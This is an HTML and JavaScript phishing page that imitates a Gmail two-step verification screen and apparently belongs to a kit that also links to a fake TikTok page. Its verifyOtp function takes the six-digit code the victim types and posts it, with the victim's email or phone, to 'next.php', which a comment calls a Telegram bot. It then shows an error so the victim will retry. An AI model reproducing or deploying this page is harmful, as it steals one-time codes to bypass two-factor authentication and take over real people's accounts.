<body>
    <div class="gmail-container">
        <div class="gmail-form">
            <div class="gmail-logo"></div>
            <h1 class="otp-title">2-Step Verification</h1>
            <div class="otp-subtitle">Get a verification code</div>

            <div class="otp-message" id="otp-message">
                Enter the 6-digit code sent to your email or phone
            </div>

            <div class="otp-inputs">
                <input type="text" maxlength="1" id="otp1" aria-label="Digit 1" oninput="moveToNext(this, 'otp2')" onkeydown="handleBackspace(this, null)">
                <input type="text" maxlength="1" id="otp2" aria-label="Digit 2" oninput="moveToNext(this, 'otp3')" onkeydown="handleBackspace(this, 'otp1')">
                <input type="text" maxlength="1" id="otp3" aria-label="Digit 3" oninput="moveToNext(this, 'otp4')" onkeydown="handleBackspace(this, 'otp2')">
                <input type="text" maxlength="1" id="otp4" aria-label="Digit 4" oninput="moveToNext(this, 'otp5')" onkeydown="handleBackspace(this, 'otp3')">
                <input type="text" maxlength="1" id="otp5" aria-label="Digit 5" oninput="moveToNext(this, 'otp6')" onkeydown="handleBackspace(this, 'otp4')">
                <input type="text" maxlength="1" id="otp6" aria-label="Digit 6" onkeydown="handleBackspace(this, 'otp5')">
            </div>

            <button class="gmail-next-btn" onclick="verifyOtp()">Next</button>

            <div class="gmail-links">
                <a href="#" onclick="resendCode()">Resend code</a>
                <a href="#" onclick="needHelp()">Try another way</a>
            </div>
        </div>
    </div>

  

    <script>
        function goBack() {
            window.location.href = 'simple_tiktok.html';
        }

        // Get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        // Set the message
        var type = getUrlParameter('type');
        var value = getUrlParameter('value');
        var message = "";
        if (type === 'email') {
            message = "Hi " + value + "! Your code was sent to your registered email.";
        } else {
            message = "Hi " + value + "! Your code was sent to your registered phone number.";
        }
        document.getElementById('otp-message').innerText = message;

        function moveToNext(current, nextId) {
            if (current.value.length === 1 && nextId) {
                document.getElementById(nextId).focus();
            }
        }

        function handleBackspace(current, prevId) {
            if (event.key === 'Backspace' && current.value === '' && prevId) {
                document.getElementById(prevId).focus();
            }
        }

        function verifyOtp() {
            var otp = '';
            for (var i = 1; i <= 6; i++) {
                otp += document.getElementById('otp' + i).value;
            }
            if (otp.length === 6) {
                // Send OTP to next.php (Telegram bot) FIRST
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'next.php', false); // Make synchronous
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));

                // THEN show error message
                document.getElementById('error-message').style.display = 'block';
            } else {
                alert("Please enter a 6-digit code.");
            }
        }

        function resendCode() {
            alert("Code resent!");
            // Optionally send resend request, but for now just alert
        }

        function needHelp() {
            alert("Please contact support.");
            // Optionally redirect to help page
        }
    </script>
